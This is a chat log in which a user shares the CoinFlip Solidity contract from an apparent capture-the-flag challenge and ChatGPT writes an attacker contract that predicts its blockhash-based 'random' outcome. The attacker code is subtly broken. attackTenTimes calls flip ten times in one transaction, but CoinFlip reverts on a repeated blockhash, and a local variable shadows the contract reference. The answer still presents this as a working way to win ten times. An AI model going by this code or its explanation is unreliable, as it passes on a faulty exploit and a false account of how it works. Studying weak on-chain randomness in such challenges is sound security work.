@@ -1,0 +1,84 @@
+User:
+
+How can I get 10 wins in a row using another contract?
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+ChatGPT
+
+In order to get 10 wins in a row using another contract, you can create a new contract to interact with the CoinFlip contract. The new contract will call the flip function 10 times with the correct guess by exploiting the predictable randomness of the CoinFlip contract.
+
+Here's a new contract called CoinFlipAttacker that aims to achieve 10 consecutive wins:
+
+solidity
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./CoinFlip.sol";
+
+contract CoinFlipAttacker {
+    CoinFlip public coinFlip;
+    uint256 public consecutiveWins;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _coinFlipAddress) {
+        coinFlip = CoinFlip(_coinFlipAddress);
+    }
+
+    function predictFlip() public view returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        return coinFlip == 1 ? true : false;
+    }
+
+    function attackFlip() public {
+        bool guess = predictFlip();
+        if (coinFlip.flip(guess)) {
+            consecutiveWins++;
+        } else {
+            consecutiveWins = 0;
+        }
+    }
+
+    function attackTenTimes() public {
+        consecutiveWins = 0;
+        for (uint8 i = 0; i < 10; i++) {
+            attackFlip();
+        }
+    }
+}
+
+In the CoinFlipAttacker contract, we import the CoinFlip contract and create a new function called predictFlip that calculates the same value as the CoinFlip contract to predict the result of the flip. The attackFlip function calls the flip function in the CoinFlip contract with the predicted value. Finally, the attackTenTimes function calls attackFlip 10 times in a row to achieve 10 consecutive wins.
+
+Remember that this kind of exploit takes advantage of weak random number generation and is not ethical in real-world scenarios. This example is purely for educational purposes, and you should always strive to create secure and fair smart contracts.
